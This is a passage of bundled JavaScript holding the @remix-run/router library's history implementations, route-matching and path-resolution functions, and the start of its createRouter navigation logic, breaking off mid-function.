var __create = Object.create;
var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __getProtoOf = Object.getPrototypeOf, __hasOwnProp = Object.prototype.hasOwnProperty;
var __esm = (fn, res) => function() {
  return fn && (res = (0, fn[__getOwnPropNames(fn)[0]])(fn = 0)), res;
};
var __commonJS = (cb, mod) => function() {
  return mod || (0, cb[__getOwnPropNames(cb)[0]])((mod = { exports: {} }).exports, mod), mod.exports;
};
var __export = (target, all) => {
  for (var name in all)
    __defProp(target, name, { get: all[name], enumerable: !0 });
}, __copyProps = (to, from, except, desc) => {
  if (from && typeof from == "object" || typeof from == "function")
    for (let key of __getOwnPropNames(from))
      !__hasOwnProp.call(to, key) && key !== except && __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
  return to;
};
var __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {}, __copyProps(
  // If the importer is in node compatibility mode or this is not an ESM
  // file that has been converted to a CommonJS file using a Babel-
  // compatible transform (i.e. "__esModule" has not been set), then set
  // "default" to the CommonJS "module.exports" for node compatibility.
  isNodeMode || !mod || !mod.__esModule ? __defProp(target, "default", { value: mod, enumerable: !0 }) : target,
  mod
)), __toCommonJS = (mod) => __copyProps(__defProp({}, "__esModule", { value: !0 }), mod);

// node_modules/@remix-run/router/dist/router.js
var router_exports = {};
__export(router_exports, {
  AbortedDeferredError: () => AbortedDeferredError,
  Action: () => Action,
  ErrorResponse: () => ErrorResponse,
  IDLE_BLOCKER: () => IDLE_BLOCKER,
  IDLE_FETCHER: () => IDLE_FETCHER,
  IDLE_NAVIGATION: () => IDLE_NAVIGATION,
  UNSAFE_DEFERRED_SYMBOL: () => UNSAFE_DEFERRED_SYMBOL,
  UNSAFE_DeferredData: () => DeferredData,
  UNSAFE_convertRoutesToDataRoutes: () => convertRoutesToDataRoutes,
  UNSAFE_getPathContributingMatches: () => getPathContributingMatches,
  UNSAFE_invariant: () => invariant,
  UNSAFE_warning: () => warning,
  createBrowserHistory: () => createBrowserHistory,
  createHashHistory: () => createHashHistory,
  createMemoryHistory: () => createMemoryHistory,
  createPath: () => createPath,
  createRouter: () => createRouter,
  createStaticHandler: () => createStaticHandler,
  defer: () => defer,
  generatePath: () => generatePath,
  getStaticContextFromError: () => getStaticContextFromError,
  getToPathname: () => getToPathname,
  isDeferredData: () => isDeferredData,
  isRouteErrorResponse: () => isRouteErrorResponse,
  joinPaths: () => joinPaths,
  json: () => json,
  matchPath: () => matchPath,
  matchRoutes: () => matchRoutes,
  normalizePathname: () => normalizePathname,
  parsePath: () => parsePath,
  redirect: () => redirect,
  resolvePath: () => resolvePath,
  resolveTo: () => resolveTo,
  stripBasename: () => stripBasename
});
function _extends() {
  return _extends = Object.assign ? Object.assign.bind() : function(target) {
    for (var i = 1; i < arguments.length; i++) {
      var source = arguments[i];
      for (var key in source)
        Object.prototype.hasOwnProperty.call(source, key) && (target[key] = source[key]);
    }
    return target;
  }, _extends.apply(this, arguments);
}
function createMemoryHistory(options) {
  options === void 0 && (options = {});
  let {
    initialEntries = ["/"],
    initialIndex,
    v5Compat = !1
  } = options, entries;
  entries = initialEntries.map((entry2, index2) => createMemoryLocation(entry2, typeof entry2 == "string" ? null : entry2.state, index2 === 0 ? "default" : void 0));
  let index = clampIndex(initialIndex ?? entries.length - 1), action2 = Action.Pop, listener = null;
  function clampIndex(n) {
    return Math.min(Math.max(n, 0), entries.length - 1);
  }
  function getCurrentLocation() {
    return entries[index];
  }
  function createMemoryLocation(to, state, key) {
    state === void 0 && (state = null);
    let location = createLocation(entries ? getCurrentLocation().pathname : "/", to, state, key);
    return warning(location.pathname.charAt(0) === "/", "relative pathnames are not supported in memory history: " + JSON.stringify(to)), location;
  }
  function createHref(to) {
    return typeof to == "string" ? to : createPath(to);
  }
  return {
    get index() {
      return index;
    },
    get action() {
      return action2;
    },
    get location() {
      return getCurrentLocation();
    },
    createHref,
    createURL(to) {
      return new URL(createHref(to), "http://localhost");
    },
    encodeLocation(to) {
      let path2 = typeof to == "string" ? parsePath(to) : to;
      return {
        pathname: path2.pathname || "",
        search: path2.search || "",
        hash: path2.hash || ""
      };
    },
    push(to, state) {
      action2 = Action.Push;
      let nextLocation = createMemoryLocation(to, state);
      index += 1, entries.splice(index, entries.length, nextLocation), v5Compat && listener && listener({
        action: action2,
        location: nextLocation,
        delta: 1
      });
    },
    replace(to, state) {
      action2 = Action.Replace;
      let nextLocation = createMemoryLocation(to, state);
      entries[index] = nextLocation, v5Compat && listener && listener({
        action: action2,
        location: nextLocation,
        delta: 0
      });
    },
    go(delta) {
      action2 = Action.Pop;
      let nextIndex = clampIndex(index + delta), nextLocation = entries[nextIndex];
      index = nextIndex, listener && listener({
        action: action2,
        location: nextLocation,
        delta
      });
    },
    listen(fn) {
      return listener = fn, () => {
        listener = null;
      };
    }
  };
}
function createBrowserHistory(options) {
  options === void 0 && (options = {});
  function createBrowserLocation(window2, globalHistory) {
    let {
      pathname,
      search,
      hash
    } = window2.location;
    return createLocation(
      "",
      {
        pathname,
        search,
        hash
      },
      // state defaults to `null` because `window.history.state` does
      globalHistory.state && globalHistory.state.usr || null,
      globalHistory.state && globalHistory.state.key || "default"
    );
  }
  function createBrowserHref(window2, to) {
    return typeof to == "string" ? to : createPath(to);
  }
  return getUrlBasedHistory(createBrowserLocation, createBrowserHref, null, options);
}
function createHashHistory(options) {
  options === void 0 && (options = {});
  function createHashLocation(window2, globalHistory) {
    let {
      pathname = "/",
      search = "",
      hash = ""
    } = parsePath(window2.location.hash.substr(1));
    return createLocation(
      "",
      {
        pathname,
        search,
        hash
      },
      // state defaults to `null` because `window.history.state` does
      globalHistory.state && globalHistory.state.usr || null,
      globalHistory.state && globalHistory.state.key || "default"
    );
  }
  function createHashHref(window2, to) {
    let base = window2.document.querySelector("base"), href = "";
    if (base && base.getAttribute("href")) {
      let url = window2.location.href, hashIndex = url.indexOf("#");
      href = hashIndex === -1 ? url : url.slice(0, hashIndex);
    }
    return href + "#" + (typeof to == "string" ? to : createPath(to));
  }
  function validateHashLocation(location, to) {
    warning(location.pathname.charAt(0) === "/", "relative pathnames are not supported in hash history.push(" + JSON.stringify(to) + ")");
  }
  return getUrlBasedHistory(createHashLocation, createHashHref, validateHashLocation, options);
}
function invariant(value, message) {
  if (value === !1 || value === null || typeof value > "u")
    throw new Error(message);
}
function warning(cond, message) {
  if (!cond) {
    typeof console < "u" && console.warn(message);
    try {
      throw new Error(message);
    } catch {
    }
  }
}
function createKey() {
  return Math.random().toString(36).substr(2, 8);
}
function getHistoryState(location, index) {
  return {
    usr: location.state,
    key: location.key,
    idx: index
  };
}
function createLocation(current, to, state, key) {
  return state === void 0 && (state = null), _extends({
    pathname: typeof current == "string" ? current : current.pathname,
    search: "",
    hash: ""
  }, typeof to == "string" ? parsePath(to) : to, {
    state,
    // TODO: This could be cleaned up.  push/replace should probably just take
    // full Locations now and avoid the need to run through this flow at all
    // But that's a pretty big refactor to the current test suite so going to
    // keep as is for the time being and just let any incoming keys take precedence
    key: to && to.key || key || createKey()
  });
}
function createPath(_ref) {
  let {
    pathname = "/",
    search = "",
    hash = ""
  } = _ref;
  return search && search !== "?" && (pathname += search.charAt(0) === "?" ? search : "?" + search), hash && hash !== "#" && (pathname += hash.charAt(0) === "#" ? hash : "#" + hash), pathname;
}
function parsePath(path2) {
  let parsedPath = {};
  if (path2) {
    let hashIndex = path2.indexOf("#");
    hashIndex >= 0 && (parsedPath.hash = path2.substr(hashIndex), path2 = path2.substr(0, hashIndex));
    let searchIndex = path2.indexOf("?");
    searchIndex >= 0 && (parsedPath.search = path2.substr(searchIndex), path2 = path2.substr(0, searchIndex)), path2 && (parsedPath.pathname = path2);
  }
  return parsedPath;
}
function getUrlBasedHistory(getLocation, createHref, validateLocation, options) {
  options === void 0 && (options = {});
  let {
    window: window2 = document.defaultView,
    v5Compat = !1
  } = options, globalHistory = window2.history, action2 = Action.Pop, listener = null, index = getIndex();
  index == null && (index = 0, globalHistory.replaceState(_extends({}, globalHistory.state, {
    idx: index
  }), ""));
  function getIndex() {
    return (globalHistory.state || {
      idx: null
    }).idx;
  }
  function handlePop() {
    action2 = Action.Pop;
    let nextIndex = getIndex(), delta = nextIndex == null ? null : nextIndex - index;
    index = nextIndex, listener && listener({
      action: action2,
      location: history.location,
      delta
    });
  }
  function push(to, state) {
    action2 = Action.Push;
    let location = createLocation(history.location, to, state);
    validateLocation && validateLocation(location, to), index = getIndex() + 1;
    let historyState = getHistoryState(location, index), url = history.createHref(location);
    try {
      globalHistory.pushState(historyState, "", url);
    } catch (error) {
      if (error instanceof DOMException && error.name === "DataCloneError")
        throw error;
      window2.location.assign(url);
    }
    v5Compat && listener && listener({
      action: action2,
      location: history.location,
      delta: 1
    });
  }
  function replace(to, state) {
    action2 = Action.Replace;
    let location = createLocation(history.location, to, state);
    validateLocation && validateLocation(location, to), index = getIndex();
    let historyState = getHistoryState(location, index), url = history.createHref(location);
    globalHistory.replaceState(historyState, "", url), v5Compat && listener && listener({
      action: action2,
      location: history.location,
      delta: 0
    });
  }
  function createURL(to) {
    let base = window2.location.origin !== "null" ? window2.location.origin : window2.location.href, href = typeof to == "string" ? to : createPath(to);
    return invariant(base, "No window.location.(origin|href) available to create URL for href: " + href), new URL(href, base);
  }
  let history = {
    get action() {
      return action2;
    },
    get location() {
      return getLocation(window2, globalHistory);
    },
    listen(fn) {
      if (listener)
        throw new Error("A history only accepts one active listener");
      return window2.addEventListener(PopStateEventType, handlePop), listener = fn, () => {
        window2.removeEventListener(PopStateEventType, handlePop), listener = null;
      };
    },
    createHref(to) {
      return createHref(window2, to);
    },
    createURL,
    encodeLocation(to) {
      let url = createURL(to);
      return {
        pathname: url.pathname,
        search: url.search,
        hash: url.hash
      };
    },
    push,
    replace,
    go(n) {
      return globalHistory.go(n);
    }
  };
  return history;
}
function isIndexRoute(route) {
  return route.index === !0;
}
function convertRoutesToDataRoutes(routes2, mapRouteProperties2, parentPath, manifest) {
  return parentPath === void 0 && (parentPath = []), manifest === void 0 && (manifest = {}), routes2.map((route, index) => {
    let treePath = [...parentPath, index], id = typeof route.id == "string" ? route.id : treePath.join("-");
    if (invariant(route.index !== !0 || !route.children, "Cannot specify children on an index route"), invariant(!manifest[id], 'Found a route id collision on id "' + id + `".  Route id's must be globally unique within Data Router usages`), isIndexRoute(route)) {
      let indexRoute = _extends({}, route, mapRouteProperties2(route), {
        id
      });
      return manifest[id] = indexRoute, indexRoute;
    } else {
      let pathOrLayoutRoute = _extends({}, route, mapRouteProperties2(route), {
        id,
        children: void 0
      });
      return manifest[id] = pathOrLayoutRoute, route.children && (pathOrLayoutRoute.children = convertRoutesToDataRoutes(route.children, mapRouteProperties2, treePath, manifest)), pathOrLayoutRoute;
    }
  });
}
function matchRoutes(routes2, locationArg, basename) {
  basename === void 0 && (basename = "/");
  let location = typeof locationArg == "string" ? parsePath(locationArg) : locationArg, pathname = stripBasename(location.pathname || "/", basename);
  if (pathname == null)
    return null;
  let branches = flattenRoutes(routes2);
  rankRouteBranches(branches);
  let matches = null;
  for (let i = 0; matches == null && i < branches.length; ++i)
    matches = matchRouteBranch(
      branches[i],
      // Incoming pathnames are generally encoded from either window.location
      // or from router.navigate, but we want to match against the unencoded
      // paths in the route definitions.  Memory router locations won't be
      // encoded here but there also shouldn't be anything to decode so this
      // should be a safe operation.  This avoids needing matchRoutes to be
      // history-aware.
      safelyDecodeURI(pathname)
    );
  return matches;
}
function flattenRoutes(routes2, branches, parentsMeta, parentPath) {
  branches === void 0 && (branches = []), parentsMeta === void 0 && (parentsMeta = []), parentPath === void 0 && (parentPath = "");
  let flattenRoute = (route, index, relativePath) => {
    let meta2 = {
      relativePath: relativePath === void 0 ? route.path || "" : relativePath,
      caseSensitive: route.caseSensitive === !0,
      childrenIndex: index,
      route
    };
    meta2.relativePath.startsWith("/") && (invariant(meta2.relativePath.startsWith(parentPath), 'Absolute route path "' + meta2.relativePath + '" nested under path ' + ('"' + parentPath + '" is not valid. An absolute child route path ') + "must start with the combined path of all its parent routes."), meta2.relativePath = meta2.relativePath.slice(parentPath.length));
    let path2 = joinPaths([parentPath, meta2.relativePath]), routesMeta = parentsMeta.concat(meta2);
    route.children && route.children.length > 0 && (invariant(
      // Our types know better, but runtime JS may not!
      // @ts-expect-error
      route.index !== !0,
      "Index routes must not have child routes. Please remove " + ('all child routes from route path "' + path2 + '".')
    ), flattenRoutes(route.children, branches, routesMeta, path2)), !(route.path == null && !route.index) && branches.push({
      path: path2,
      score: computeScore(path2, route.index),
      routesMeta
    });
  };
  return routes2.forEach((route, index) => {
    var _route$path;
    if (route.path === "" || !((_route$path = route.path) != null && _route$path.includes("?")))
      flattenRoute(route, index);
    else
      for (let exploded of explodeOptionalSegments(route.path))
        flattenRoute(route, index, exploded);
  }), branches;
}
function explodeOptionalSegments(path2) {
  let segments = path2.split("/");
  if (segments.length === 0)
    return [];
  let [first, ...rest] = segments, isOptional = first.endsWith("?"), required = first.replace(/\?$/, "");
  if (rest.length === 0)
    return isOptional ? [required, ""] : [required];
  let restExploded = explodeOptionalSegments(rest.join("/")), result = [];
  return result.push(...restExploded.map((subpath) => subpath === "" ? required : [required, subpath].join("/"))), isOptional && result.push(...restExploded), result.map((exploded) => path2.startsWith("/") && exploded === "" ? "/" : exploded);
}
function rankRouteBranches(branches) {
  branches.sort((a, b) => a.score !== b.score ? b.score - a.score : compareIndexes(a.routesMeta.map((meta2) => meta2.childrenIndex), b.routesMeta.map((meta2) => meta2.childrenIndex)));
}
function computeScore(path2, index) {
  let segments = path2.split("/"), initialScore = segments.length;
  return segments.some(isSplat) && (initialScore += splatPenalty), index && (initialScore += indexRouteValue), segments.filter((s) => !isSplat(s)).reduce((score, segment) => score + (paramRe.test(segment) ? dynamicSegmentValue : segment === "" ? emptySegmentValue : staticSegmentValue), initialScore);
}
function compareIndexes(a, b) {
  return a.length === b.length && a.slice(0, -1).every((n, i) => n === b[i]) ? (
    // If two routes are siblings, we should try to match the earlier sibling
    // first. This allows people to have fine-grained control over the matching
    // behavior by simply putting routes with identical paths in the order they
    // want them tried.
    a[a.length - 1] - b[b.length - 1]
  ) : (
    // Otherwise, it doesn't really make sense to rank non-siblings by index,
    // so they sort equally.
    0
  );
}
function matchRouteBranch(branch, pathname) {
  let {
    routesMeta
  } = branch, matchedParams = {}, matchedPathname = "/", matches = [];
  for (let i = 0; i < routesMeta.length; ++i) {
    let meta2 = routesMeta[i], end = i === routesMeta.length - 1, remainingPathname = matchedPathname === "/" ? pathname : pathname.slice(matchedPathname.length) || "/", match = matchPath({
      path: meta2.relativePath,
      caseSensitive: meta2.caseSensitive,
      end
    }, remainingPathname);
    if (!match)
      return null;
    Object.assign(matchedParams, match.params);
    let route = meta2.route;
    matches.push({
      // TODO: Can this as be avoided?
      params: matchedParams,
      pathname: joinPaths([matchedPathname, match.pathname]),
      pathnameBase: normalizePathname(joinPaths([matchedPathname, match.pathnameBase])),
      route
    }), match.pathnameBase !== "/" && (matchedPathname = joinPaths([matchedPathname, match.pathnameBase]));
  }
  return matches;
}
function generatePath(originalPath, params) {
  params === void 0 && (params = {});
  let path2 = originalPath;
  path2.endsWith("*") && path2 !== "*" && !path2.endsWith("/*") && (warning(!1, 'Route path "' + path2 + '" will be treated as if it were ' + ('"' + path2.replace(/\*$/, "/*") + '" because the `*` character must ') + "always follow a `/` in the pattern. To get rid of this warning, " + ('please change the route path to "' + path2.replace(/\*$/, "/*") + '".')), path2 = path2.replace(/\*$/, "/*"));
  let prefix = path2.startsWith("/") ? "/" : "", stringify = (p) => p == null ? "" : typeof p == "string" ? p : String(p), segments = path2.split(/\/+/).map((segment, index, array) => {
    if (index === array.length - 1 && segment === "*")
      return stringify(params["*"]);
    let keyMatch = segment.match(/^:(\w+)(\??)$/);
    if (keyMatch) {
      let [, key, optional] = keyMatch, param = params[key];
      return invariant(optional === "?" || param != null, 'Missing ":' + key + '" param'), stringify(param);
    }
    return segment.replace(/\?$/g, "");
  }).filter((segment) => !!segment);
  return prefix + segments.join("/");
}
function matchPath(pattern, pathname) {
  typeof pattern == "string" && (pattern = {
    path: pattern,
    caseSensitive: !1,
    end: !0
  });
  let [matcher, paramNames] = compilePath(pattern.path, pattern.caseSensitive, pattern.end), match = pathname.match(matcher);
  if (!match)
    return null;
  let matchedPathname = match[0], pathnameBase = matchedPathname.replace(/(.)\/+$/, "$1"), captureGroups = match.slice(1);
  return {
    params: paramNames.reduce((memo, paramName, index) => {
      if (paramName === "*") {
        let splatValue = captureGroups[index] || "";
        pathnameBase = matchedPathname.slice(0, matchedPathname.length - splatValue.length).replace(/(.)\/+$/, "$1");
      }
      return memo[paramName] = safelyDecodeURIComponent(captureGroups[index] || "", paramName), memo;
    }, {}),
    pathname: matchedPathname,
    pathnameBase,
    pattern
  };
}
function compilePath(path2, caseSensitive, end) {
  caseSensitive === void 0 && (caseSensitive = !1), end === void 0 && (end = !0), warning(path2 === "*" || !path2.endsWith("*") || path2.endsWith("/*"), 'Route path "' + path2 + '" will be treated as if it were ' + ('"' + path2.replace(/\*$/, "/*") + '" because the `*` character must ') + "always follow a `/` in the pattern. To get rid of this warning, " + ('please change the route path to "' + path2.replace(/\*$/, "/*") + '".'));
  let paramNames = [], regexpSource = "^" + path2.replace(/\/*\*?$/, "").replace(/^\/*/, "/").replace(/[\\.*+^$?{}|()[\]]/g, "\\$&").replace(/\/:(\w+)/g, (_, paramName) => (paramNames.push(paramName), "/([^\\/]+)"));
  return path2.endsWith("*") ? (paramNames.push("*"), regexpSource += path2 === "*" || path2 === "/*" ? "(.*)$" : "(?:\\/(.+)|\\/*)$") : end ? regexpSource += "\\/*$" : path2 !== "" && path2 !== "/" && (regexpSource += "(?:(?=\\/|$))"), [new RegExp(regexpSource, caseSensitive ? void 0 : "i"), paramNames];
}
function safelyDecodeURI(value) {
  try {
    return decodeURI(value);
  } catch (error) {
    return warning(!1, 'The URL path "' + value + '" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent ' + ("encoding (" + error + ").")), value;
  }
}
function safelyDecodeURIComponent(value, paramName) {
  try {
    return decodeURIComponent(value);
  } catch (error) {
    return warning(!1, 'The value for the URL param "' + paramName + '" will not be decoded because' + (' the string "' + value + '" is a malformed URL segment. This is probably') + (" due to a bad percent encoding (" + error + ").")), value;
  }
}
function stripBasename(pathname, basename) {
  if (basename === "/")
    return pathname;
  if (!pathname.toLowerCase().startsWith(basename.toLowerCase()))
    return null;
  let startIndex = basename.endsWith("/") ? basename.length - 1 : basename.length, nextChar = pathname.charAt(startIndex);
  return nextChar && nextChar !== "/" ? null : pathname.slice(startIndex) || "/";
}
function resolvePath(to, fromPathname) {
  fromPathname === void 0 && (fromPathname = "/");
  let {
    pathname: toPathname,
    search = "",
    hash = ""
  } = typeof to == "string" ? parsePath(to) : to;
  return {
    pathname: toPathname ? toPathname.startsWith("/") ? toPathname : resolvePathname(toPathname, fromPathname) : fromPathname,
    search: normalizeSearch(search),
    hash: normalizeHash(hash)
  };
}
function resolvePathname(relativePath, fromPathname) {
  let segments = fromPathname.replace(/\/+$/, "").split("/");
  return relativePath.split("/").forEach((segment) => {
    segment === ".." ? segments.length > 1 && segments.pop() : segment !== "." && segments.push(segment);
  }), segments.length > 1 ? segments.join("/") : "/";
}
function getInvalidPathError(char, field, dest, path2) {
  return "Cannot include a '" + char + "' character in a manually specified " + ("`to." + field + "` field [" + JSON.stringify(path2) + "].  Please separate it out to the ") + ("`to." + dest + "` field. Alternatively you may provide the full path as ") + 'a string in <Link to="..."> and the router will parse it for you.';
}
function getPathContributingMatches(matches) {
  return matches.filter((match, index) => index === 0 || match.route.path && match.route.path.length > 0);
}
function resolveTo(toArg, routePathnames, locationPathname, isPathRelative) {
  isPathRelative === void 0 && (isPathRelative = !1);
  let to;
  typeof toArg == "string" ? to = parsePath(toArg) : (to = _extends({}, toArg), invariant(!to.pathname || !to.pathname.includes("?"), getInvalidPathError("?", "pathname", "search", to)), invariant(!to.pathname || !to.pathname.includes("#"), getInvalidPathError("#", "pathname", "hash", to)), invariant(!to.search || !to.search.includes("#"), getInvalidPathError("#", "search", "hash", to)));
  let isEmptyPath = toArg === "" || to.pathname === "", toPathname = isEmptyPath ? "/" : to.pathname, from;
  if (isPathRelative || toPathname == null)
    from = locationPathname;
  else {
    let routePathnameIndex = routePathnames.length - 1;
    if (toPathname.startsWith("..")) {
      let toSegments = toPathname.split("/");
      for (; toSegments[0] === ".."; )
        toSegments.shift(), routePathnameIndex -= 1;
      to.pathname = toSegments.join("/");
    }
    from = routePathnameIndex >= 0 ? routePathnames[routePathnameIndex] : "/";
  }
  let path2 = resolvePath(to, from), hasExplicitTrailingSlash = toPathname && toPathname !== "/" && toPathname.endsWith("/"), hasCurrentTrailingSlash = (isEmptyPath || toPathname === ".") && locationPathname.endsWith("/");
  return !path2.pathname.endsWith("/") && (hasExplicitTrailingSlash || hasCurrentTrailingSlash) && (path2.pathname += "/"), path2;
}
function getToPathname(to) {
  return to === "" || to.pathname === "" ? "/" : typeof to == "string" ? parsePath(to).pathname : to.pathname;
}
function isTrackedPromise(value) {
  return value instanceof Promise && value._tracked === !0;
}
function unwrapTrackedPromise(value) {
  if (!isTrackedPromise(value))
    return value;
  if (value._error)
    throw value._error;
  return value._data;
}
function isRouteErrorResponse(error) {
  return error != null && typeof error.status == "number" && typeof error.statusText == "string" && typeof error.internal == "boolean" && "data" in error;
}
function createRouter(init) {
  let routerWindow = init.window ? init.window : typeof window < "u" ? window : void 0, isBrowser2 = typeof routerWindow < "u" && typeof routerWindow.document < "u" && typeof routerWindow.document.createElement < "u", isServer = !isBrowser2;
  invariant(init.routes.length > 0, "You must provide a non-empty routes array to createRouter");
  let mapRouteProperties2;
  if (init.mapRouteProperties)
    mapRouteProperties2 = init.mapRouteProperties;
  else if (init.detectErrorBoundary) {
    let detectErrorBoundary = init.detectErrorBoundary;
    mapRouteProperties2 = (route) => ({
      hasErrorBoundary: detectErrorBoundary(route)
    });
  } else
    mapRouteProperties2 = defaultMapRouteProperties;
  let manifest = {}, dataRoutes = convertRoutesToDataRoutes(init.routes, mapRouteProperties2, void 0, manifest), inFlightDataRoutes, basename = init.basename || "/", future2 = _extends({
    v7_normalizeFormMethod: !1,
    v7_prependBasename: !1
  }, init.future), unlistenHistory = null, subscribers = /* @__PURE__ */ new Set(), savedScrollPositions2 = null, getScrollRestorationKey = null, getScrollPosition = null, initialScrollRestored = init.hydrationData != null, initialMatches = matchRoutes(dataRoutes, init.history.location, basename), initialErrors = null;
  if (initialMatches == null) {
    let error = getInternalRouterError(404, {
      pathname: init.history.location.pathname
    }), {
      matches,
      route
    } = getShortCircuitMatches(dataRoutes);
    initialMatches = matches, initialErrors = {
      [route.id]: error
    };
  }
  let initialized = (
    // All initialMatches need to be loaded before we're ready.  If we have lazy
    // functions around still then we'll need to run them in initialize()
    !initialMatches.some((m) => m.route.lazy) && // And we have to either have no loaders or have been provided hydrationData
    (!initialMatches.some((m) => m.route.loader) || init.hydrationData != null)
  ), router, state = {
    historyAction: init.history.action,
    location: init.history.location,
    matches: initialMatches,
    initialized,
    navigation: IDLE_NAVIGATION,
    // Don't restore on initial updateState() if we were SSR'd
    restoreScrollPosition: init.hydrationData != null ? !1 : null,
    preventScrollReset: !1,
    revalidation: "idle",
    loaderData: init.hydrationData && init.hydrationData.loaderData || {},
    actionData: init.hydrationData && init.hydrationData.actionData || null,
    errors: init.hydrationData && init.hydrationData.errors || initialErrors,
    fetchers: /* @__PURE__ */ new Map(),
    blockers: /* @__PURE__ */ new Map()
  }, pendingAction = Action.Pop, pendingPreventScrollReset = !1, pendingNavigationController, isUninterruptedRevalidation = !1, isRevalidationRequired = !1, cancelledDeferredRoutes = [], cancelledFetcherLoads = [], fetchControllers = /* @__PURE__ */ new Map(), incrementingLoadId = 0, pendingNavigationLoadId = -1, fetchReloadIds = /* @__PURE__ */ new Map(), fetchRedirectIds = /* @__PURE__ */ new Set(), fetchLoadMatches = /* @__PURE__ */ new Map(), activeDeferreds = /* @__PURE__ */ new Map(), blockerFunctions = /* @__PURE__ */ new Map(), ignoreNextHistoryUpdate = !1;
  function initialize() {
    return unlistenHistory = init.history.listen((_ref) => {
      let {
        action: historyAction,
        location,
        delta
      } = _ref;
      if (ignoreNextHistoryUpdate) {
        ignoreNextHistoryUpdate = !1;
        return;
      }
      warning(blockerFunctions.size === 0 || delta != null, "You are trying to use a blocker on a POP navigation to a location that was not created by @remix-run/router. This will fail silently in production. This can happen if you are navigating outside the router via `window.history.pushState`/`window.location.hash` instead of using router navigation APIs.  This can also happen if you are using createHashRouter and the user manually changes the URL.");
      let blockerKey = shouldBlockNavigation({
        currentLocation: state.location,
        nextLocation: location,
        historyAction
      });
      if (blockerKey && delta != null) {
        ignoreNextHistoryUpdate = !0, init.history.go(delta * -1), updateBlocker(blockerKey, {
          state: "blocked",
          location,
          proceed() {
            updateBlocker(blockerKey, {
              state: "proceeding",
              proceed: void 0,
              reset: void 0,
              location
            }), init.history.go(delta);
          },
          reset() {
            let blockers = new Map(state.blockers);
            blockers.set(blockerKey, IDLE_BLOCKER), updateState({
              blockers
            });
          }
        });
        return;
      }
      return startNavigation(historyAction, location);
    }), state.initialized || startNavigation(Action.Pop, state.location), router;
  }
  function dispose() {
    unlistenHistory && unlistenHistory(), subscribers.clear(), pendingNavigationController && pendingNavigationController.abort(), state.fetchers.forEach((_, key) => deleteFetcher(key)), state.blockers.forEach((_, key) => deleteBlocker(key));
  }
  function subscribe(fn) {
    return subscribers.add(fn), () => subscribers.delete(fn);
  }
  function updateState(newState) {
    state = _extends({}, state, newState), subscribers.forEach((subscriber) => subscriber(state));
  }
  function completeNavigation(location, newState) {
    var _location$state, _location$state2;
    let isActionReload = state.actionData != null && state.navigation.formMethod != null && isMutationMethod(state.navigation.formMethod) && state.navigation.state === "loading" && ((_location$state = location.state) == null ? void 0 : _location$state._isRedirect) !== !0, actionData;
    newState.actionData ? Object.keys(newState.actionData).length > 0 ? actionData = newState.actionData : actionData = null : isActionReload ? actionData = state.actionData : actionData = null;
    let loaderData = newState.loaderData ? mergeLoaderData(state.loaderData, newState.loaderData, newState.matches || [], newState.errors) : state.loaderData, blockers = state.blockers;
    blockers.size > 0 && (blockers = new Map(blockers), blockers.forEach((_, k) => blockers.set(k, IDLE_BLOCKER)));
    let preventScrollReset = pendingPreventScrollReset === !0 || state.navigation.formMethod != null && isMutationMethod(state.navigation.formMethod) && ((_location$state2 = location.state) == null ? void 0 : _location$state2._isRedirect) !== !0;
    inFlightDataRoutes && (dataRoutes = inFlightDataRoutes, inFlightDataRoutes = void 0), isUninterruptedRevalidation || pendingAction === Action.Pop || (pendingAction === Action.Push ? init.history.push(location, location.state) : pendingAction === Action.Replace && init.history.replace(location, location.state)), updateState(_extends({}, newState, {
      actionData,
      loaderData,
      historyAction: pendingAction,
      location,
      initialized: !0,
      navigation: IDLE_NAVIGATION,
      revalidation: "idle",
      restoreScrollPosition: getSavedScrollPosition(location, newState.matches || state.matches),
      preventScrollReset,
      blockers
    })), pendingAction = Action.Pop, pendingPreventScrollReset = !1, isUninterruptedRevalidation = !1, isRevalidationRequired = !1, cancelledDeferredRoutes = [], cancelledFetcherLoads = [];
  }
  async function navigate(to, opts) {
    if (typeof to == "number") {
      init.history.go(to);
      return;
    }
    let normalizedPath = normalizeTo(state.location, state.matches, basename, future2.v7_prependBasename, to, opts == null ? void 0 : opts.fromRouteId, opts == null ? void 0 : opts.relative), {
      path: path2,
      submission,
      error
    } = normalizeNavigateOptions(future2.v7_normalizeFormMethod, !1, normalizedPath, opts), currentLocation = state.location, nextLocation = createLocation(state.location, path2, opts && opts.state);
    nextLocation = _extends({}, nextLocation, init.history.encodeLocation(nextLocation));
    let userReplace = opts && opts.replace != null ? opts.replace : void 0, historyAction = Action.Push;
    userReplace === !0 ? historyAction = Action.Replace : userReplace === !1 || submission != null && isMutationMethod(submission.formMethod) && submission.formAction === state.location.pathname + state.location.search && (historyAction = Action.Replace);
    let preventScrollReset = opts && "preventScrollReset" in opts ? opts.preventScrollReset === !0 : void 0, blockerKey = shouldBlockNavigation({
      currentLocation,
      nextLocation,
      historyAction
    });
    if (blockerKey) {
      updateBlocker(blockerKey, {
        state: "blocked",
        location: nextLocation,
        proceed() {
          updateBlocker(blockerKey, {
            state: "proceeding",
            proceed: void 0,
            reset: void 0,
            location: nextLocation
          }), navigate(to, opts);
        },
        reset() {
          let blockers = new Map(state.blockers);
          blockers.set(blockerKey, IDLE_BLOCKER), updateState({
            blockers
          });
        }
      });
      return;
    }
    return await startNavigation(historyAction, nextLocation, {
      submission,
      // Send through the formData serialization error if we have one so we can
      // render at the right error boundary after we match routes
      pendingError: error,
      preventScrollReset,
      replace: opts && opts.replace
    });
  }
  function revalidate() {
    if (interruptActiveLoads(), updateState({
      revalidation: "loading"
    }), state.navigation.state !== "submitting") {
      if (state.navigation.state === "idle") {
        startNavigation(state.historyAction, state.location, {
          startUninterruptedRevalidation: !0
        });
        return;
      }
      startNavigation(pendingAction || state.historyAction, state.navigation.location, {
        overrideNavigation: state.navigation
      });
    }
  }
  async function startNavigation(historyAction, location, opts) {
    pendingNavigationController && pendingNavigationController.abort(), pendingNavigationController = null, pendingAction = historyAction, isUninterruptedRevalidation = (opts && opts.startUninterruptedRevalidation) === !0, saveScrollPosition(state.location, state.matches), pendingPreventScrollReset = (opts && opts.preventScrollReset) === !0;
    let routesToUse = inFlightDataRoutes || dataRoutes, loadingNavigation = opts && opts.overrideNavigation, matches = matchRoutes(routesToUse, location, basename);
